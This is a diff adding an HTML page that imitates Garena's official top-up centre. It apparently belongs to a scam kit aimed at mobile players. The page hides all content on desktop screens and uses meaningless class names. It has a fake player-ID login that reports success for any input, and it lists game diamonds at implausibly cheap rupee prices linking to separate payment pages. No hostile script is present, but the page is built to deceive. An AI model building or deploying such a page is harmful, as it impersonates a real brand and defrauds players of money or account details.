@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Garena Top Up Center</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #ffffff;
+            margin: 0;
+            /* Remove margin from the body */
+        }
+
+        /* Hide entire content on desktop */
+
+        @media (min-width: 768px) {
+            body {
+                display: none;
+            }
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background-color: white;
+            padding: 12px 15px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            width: 100%;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+        }
+
+        .logo {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-right: 8px;
+        }
+
+        .logo-container img {
+            height: 35px;
+            margin-right: 5px;
+        }
+
+        .title {
+            font-size: 15px;
+            font-weight: 600;
+            color: #333;
+            line-height: 1.2;
+        }
+
+        .profile-icon {
+            width: 35px;
+            height: 35px;
+            border-radius: 50%;
+            background-color: #ddd;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .profile-icon img {
+            width: 70%;
+            height: 70%;
+            opacity: 0.6;
+        }
+
+        /* Carousel Styles */
+
+        .carousel {
+            width: 100%;
+            max-width: 480px;
+            overflow: hidden;
+            border-radius: 0px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            position: relative;
+            margin: 0px auto;
+        }
+
+        .carousel-images {
+            display: flex;
+            transition: transform 0.5s ease;
+        }
+
+        .carousel-images img {
+            width: 100%;
+            flex-shrink: 0;
+        }
+
+        .carousel-dots {
+            position: absolute;
+            bottom: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+        }
+
+        .dot {
+            height: 14px;
+            width: 14px;
+            background-color: #bbb;
+            border-radius: 50%;
+            margin: 0 5px;
+            display: inline-block;
+            cursor: pointer;
+        }
+
+        .dot.active {
+            background-color: #717171;
+        }
+
+        .GiraffePineapple {
+            background-color: #F4F4F4;
+            border: 1px solid #F4F4F4;
+            border-radius: 8px;
+            padding: 20px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            max-width: 94%;
+        }
+
+        .BubblegumKitten {
+            font-size: 20px;
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .CorgiPancake {
+            background-color: #d32f2f;
+            color: white;
+            font-weight: bold;
+            border-radius: 50%;
+            padding: 5px 10px;
+            margin-right: 10px;
+        }
+
+        .NinjaTurtle {
+            position: relative;
+            display: flex;
+            width: 99%;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+
+        button {
+            position: absolute;
+            right: 0;
+            top: 0;
+            height: 100%;
+            background-color: #d32f2f;
+            color: white;
+            border: none;
+            padding: 0 15px;
+            font-size: 14px;
+            border-radius: 0 4px 4px 0;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #b71c1c;
+        }
+
+        label {
+            font-size: 14px;
+            font-weight: bold;
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        .UnicornRainbow {
+            margin-top: 15px;
+            font-size: 14px;
+            color: green;
+        }
+
+        /* Centering styles */
+
+        .center-div {
+            display: flex;
+            justify-content: center;
+            /* Center horizontally */
+            align-items: center;
+            /* Center vertically */
+            height: 95%;
+            /* Fill the available height */
+            margin: 0;
+            /* Remove any margin */
+        }
+
+        /* Responsive image style */
+
+        .responsive-image {
+            width: 100%;
+            /* Full width */
+            display: none;
+            /* Hide by default */
+        }
+
+        /* Show image only on mobile */
+
+        @media (max-width: 768px) {
+            .responsive-image {
+                display: block;
+                /* Show on mobile */
+            }
+        }
+
+        /* Responsive styles */
+
+        @media (max-width: 480px) {
+            .GiraffePineapple {
+                padding: 15px;
+            }
+            button {
+                padding: 0 10px;
+            }
+            .center-div {
+                height: auto;
+            }
+            .grid-container {
+                display: grid;
+                grid-template-columns: repeat(3, 1fr);
+                gap: 10px;
+                max-width: 435px;
+                max-width: 94%;
+            }
+            .grid-item {
+                background-color: white;
+                border-radius: 12px;
+                padding: 12px 12px;
+                text-align: center;
+                display: flx;
+                margin-left: 5px;
+                font-size: 16px;
+                font-weight: bold;
+                color: #000;
+                box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+                transition: transform 0.2s ease, box-shadow 0.2s ease;
+                text-decoration: none;
+            }
+            .grid-item:hover {
+                transform: translateY(-5px);
+                box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
+            }
+            .grid-item .icon {
+                width: 24px;
+                height: 24px;
+                margin-bottom: 2px;
+                margin-left: 22px;
+                display: inline-block;
+            }
+            .price-tag {
+                margin-top: 2px;
+                background: #fff;
+                color: #fff;
+                padding: 5px 10px;
+                border-radius: 8px;
+                font-size: 9px;
+                font-weight: bold;
+                display: inline-block;
+                transition: background 0.3s ease, transform 0.2s ease;
+            }
+            .grid-item a {
+                text-decoration: none;
+                color: inherit;
+                display: block;
+            }
+            .grid-item {
+                height: 68px;
+                /* Adjust this value as needed */
+            }
+            .BubblegumKitten {
+                margin: 10px;
+                /* This applies a 5px margin on all sides */
+                margin-left: 15px;
+                /* This overrides the left margin to 2px */
+            }
+            .grid-container {
+                justify-content: center;
+                /* Centers items horizontally */
+                align-items: center;
+                /* Centers items vertically */
+                margin: 0 auto;
+                /* Centers the container itself */
+            }
+            .container {
+                max-width: 435px;
+                margin: 0 auto;
+                max-width: 94%;
+            }
+            h2 {
+                font-size: 1rem;
+                color: #333;
+                margin-bottom: 10px;
+                margin-top: 10px;
+                font-weight: bold;
+                text-align: left;
+            }
+            .deals-grid {
+                display: grid;
+                grid-template-columns: repeat(2, 1fr);
+                gap: 25px;
+            }
+            .deal-card {
+                background: #ffffff;
+                border-radius: 15px;
+                padding: 0;
+                box-shadow: 0 6px 15px rgba(0, 0, 0, 0.1);
+                position: relative;
+                text-align: center;
+                overflow: hidden;
+                text-decoration: none;
+                color: inherit;
+                transition: transform 0.2s ease;
+            }
+            .deal-card:hover {
+                transform: translateY(-5px);
+            }
+            .deal-image {
+                width: 100%;
+                max-width: 170px;
+                margin: 0;
+            }
+            .card-background {
+                position: absolute;
+                top: -15px;
+                left: 0;
+                width: 100%;
+                height: 120px;
+                z-index: -1;
+                border-radius: 15px;
+            }
+            .green-background {
+                background-color: #FFF4F2;
+                /* Updated color */
+            }
+            .product-title {
+                font-size: 1rem;
+                color: #333;
+                margin-bottom: 10px;
+                font-weight: bold;
+            }
+            .price-tag {
+                color: black;
+            }
+        }
+
+        .footer-image {
+            width: auto;
+            /* Default width for larger screens */
+            margin-top: 4px;
+        }
+
+        @media (max-width: 768px) {
+            .footer-image {
+                width: 100%;
+                /* Full width for mobile devices */
+            }
+        }
+    </style>
+    </style>
+</head>
+
+<body>
+
+    <div class="header">
+        <div class="logo-container">
+            <div class="logo">
+                <img src="img/LOG.png" alt="Garena Logo">
+            </div>
+            <div class="title">Official Top Up<br>Center</div>
+        </div>
+        <div class="profile-icon">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/8/89/Portrait_Placeholder.png" alt="User Icon">
+        </div>
+    </div>
+
+    <main>
+        <div class="carousel">
+            <div class="carousel-images">
+                <img src="img/banner1.jpg" alt="Slide 1">
+                <img src="img/banner2.jpg" alt="Slide 2">
+            </div>
+            <div class="carousel-dots">
+                <span class="dot" onclick="moveToSlide(0)"></span>
+                <span class="dot" onclick="moveToSlide(1)"></span>
+            </div>
+        </div>
+    </main>
+    <div id="randomId2" class="BubblegumKitten">
+        <span id="randomId3" class="CorgiPancake">1</span>Login
+    </div>
+    <div class="center-div">
+        <div id="randomId1" class="GiraffePineapple">
+            <label for="randomId4">Player ID <span title="Enter your player ID to log in">❓</span></label>
+            <div id="randomId5" class="NinjaTurtle">
+                <input type="text" id="randomId4" placeholder="Please enter player ID here">
+                <button type="button" onclick="verifyPlayer()">Login</button>
+            </div>
+            <div id="randomId6" class="UnicornRainbow"></div>
+            <img src="img/google.jpg" style="width: 100%; margin: 0;" alt="Description of the image">
+        </div>
+    </div>
+
+    <!-- New Responsive Image -->
+    <img src="img/100.jpg" class="responsive-image" alt="Responsive Image">
+    <div id="randomId2" class="BubblegumKitten">
+        <span id="randomId3" class="CorgiPancake">2</span>Top-up Amount
+    </div>
+    <div class="grid-container">
+        <a href="Diamond/180.html" class="grid-item">
+            <div style="display: flex; align-items: center; margin-top: 10px;">
+                <img class="icon" src="img/diam.png" alt="Diamond Icon" width="150" height="150">
+                <span>180</span>
+            </div>
+            <div class="price-tag">₹60 Only</div>
+        </a>
+        <a href="Diamond/350.html" class="grid-item">
+            <div style="display: flex; align-items: center; margin-top: 10px;">
+                <img class="icon" src="img/diam.png" alt="Diamond Icon" width="150" height="150">
+                <span>350</span>
+            </div>
+            <div class="price-tag">₹149 Only</div>
+        </a>
+        <a href="Diamond/800.html" class="grid-item">
+            <div style="display: flex; align-items: center; margin-top: 10px;">
+                <img class="icon" src="img/diam.png" alt="Diamond Icon" width="150" height="150">
+                <span>800</span>
+            </div>
+            <div class="price-tag">₹279 Only</div>
+        </a>
+        <a href="Diamond/1000.html" class="grid-item">
+            <div style="display: flex; align-items: center; margin-top: 10px;">
+                <img class="icon" src="img/diam.png" alt="Diamond Icon" width="150" height="150">
+                <span>1000</span>
+            </div>
+            <div class="price-tag">₹299 Only</div>
+        </a>
+        <a href="Diamond/1200.html" class="grid-item">
+            <div style="display: flex; align-items: center; margin-top: 10px;">
+                <img class="icon" src="img/diam.png" alt="Diamond Icon" width="150" height="150">
+                <span>1200</span>
+            </div>
+            <div class="price-tag">₹349 Only</div>
+        </a>
+        <a href="Diamond/1350.html" class="grid-item">
+            <div style="display: flex; align-items: center; margin-top: 10px;">
+                <img class="icon" src="img/diam.png" alt="Diamond Icon" width="150" height="150">
+                <span>1350</span>
+            </div>
+            <div class="price-tag">₹379 Only</div>
+        </a>
+        <a href="Diamond/2000.html" class="grid-item">
+            <div style="display: flex; align-items: center; margin-top: 10px;">
+                <img class="icon" src="img/diam.png" alt="Diamond Icon" width="150" height="150">
+                <span>2000</span>
+            </div>
+            <div class="price-tag">₹449 Only</div>
+        </a>
+        <a href="Diamond/2350.html" class="grid-item">
+            <div style="display: flex; align-items: center; margin-top: 10px;">
+                <img class="icon" src="img/diam.png" alt="Diamond Icon" width="150" height="150">
+                <span>2350</span>
+            </div>
+            <div class="price-tag">₹499 Only</div>
+        </a>
+        <a href="Diamond/3350.html" class="grid-item">
+            <div style="display: flex; align-items: center; margin-top: 10px;">
+                <img class="icon" src="img/diam.png" alt="Diamond Icon" width="150" height="150">
+                <span>3350</span>
+            </div>
+            <div class="price-tag">₹599 Only</div>
+        </a>
+        <a href="Diamond/3500.html" class="grid-item">
+            <div style="display: flex; align-items: center; margin-top: 10px;">
+                <img class="icon" src="img/diam.png" alt="Diamond Icon" width="150" height="150">
+                <span>3500</span>
+            </div>
+            <div class="price-tag">₹699 Only</div>
+        </a>
+        <a href="Diamond/7000.html" class="grid-item">
+            <div style="display: flex; align-items: center; margin-top: 10px;">
+                <img class="icon" src="img/diam.png" alt="Diamond Icon" width="150" height="150">
+                <span>7000</span>
+            </div>
+            <div class="price-tag">₹749 Only</div>
+        </a>
+        <a href="Diamond/9000.html" class="grid-item">
+            <div style="display: flex; align-items: center; margin-top: 10px;">
+                <img class="icon" src="img/diam.png" alt="Diamond Icon" width="150" height="150">
+                <span>9000</span>
+            </div>
+            <div class="price-tag">₹899 Only</div>
+        </a>
+    </div>
+    </div>
+    </div>
+    <div class="container">
+        <h2>Special Deals</h2>
+        <div class="deals-grid">
+            <a href="payment/Weekly-Membership.html" class="deal-card">
+                <div class="card-background weekly-card"></div>
+                <img src="img/wmem.png" alt="Weekly Membership" class="deal-image">
+                <h3 class="product-title">Weekly Membership</h3>
+            </a>
+            <a href="payment/Monthly-Membership.html" class="deal-card">
+                <div class="card-background monthly-card"></div>
+                <img src="img/mmem.png" alt="Monthly Membership" class="deal-image">
+                <h3 class="product-title">Monthly Membership</h3>
+            </a>
+            <a href="payment/Evo-14D.html" class="deal-card">
+                <div class="card-background level-card"></div>
+                <img src="img/evo30.jpg" alt="Level Up Pass" class="deal-image">
+                <h3 class="product-title">Level Up Pass</h3>
+            </a>
+            <a href="payment/Evo-30D.html" class="deal-card">
+                <div class="card-background evo-card"></div>
+                <img src="img/evo7.jpg" alt="Evo Access 3D" class="deal-image">
+                <h3 class="product-title">Evo Access 3D</h3>
+            </a>
+        </div>
+    </div>
+    <footer>
+        <img src="img/footer.jpg" alt="Footer Image" class="footer-image">
+    </footer>
+
+    <script>
+        let currentIndex = 0;
+        const slides = document.querySelectorAll('.carousel-images img');
+        const dots = document.querySelectorAll('.dot');
+
+        function moveToSlide(index) {
+            currentIndex = index;
+            const offset = -currentIndex * 100;
+            document.querySelector('.carousel-images').style.transform = `translateX(${offset}%)`;
+            updateDots();
+        }
+
+        function updateDots() {
+            dots.forEach((dot, index) => {
+                dot.classList.toggle('active', index === currentIndex);
+            });
+        }
+
+        // Auto-slide functionality
+        setInterval(() => {
+            currentIndex = (currentIndex + 1) % slides.length;
+            const offset = -currentIndex * 100;
+            document.querySelector('.carousel-images').style.transform = `translateX(${offset}%)`;
+            updateDots();
+        }, 1800); // Change slide every 3 seconds
+
+        // Initialize the first dot as active
+        updateDots();
+
+        function verifyPlayer() {
+            const playerIdInput = document.getElementById('randomId4').value.trim();
+            const messageDiv = document.getElementById('randomId6');
+
+            if (playerIdInput) {
+                messageDiv.textContent = `Player ID ( ${playerIdInput} ) Account Login successfully.`;
+                messageDiv.style.color = 'green';
+            } else {
+                messageDiv.textContent = 'Please enter a valid Player ID.';
+                messageDiv.style.color = 'red';
+            }
+        }
+        document.querySelectorAll('.deal-card').forEach(card => {
+            card.addEventListener('click', function() {
+                this.classList.add('green-background');
+            });
+        });
+    </script>
+</body>
+
+</html>
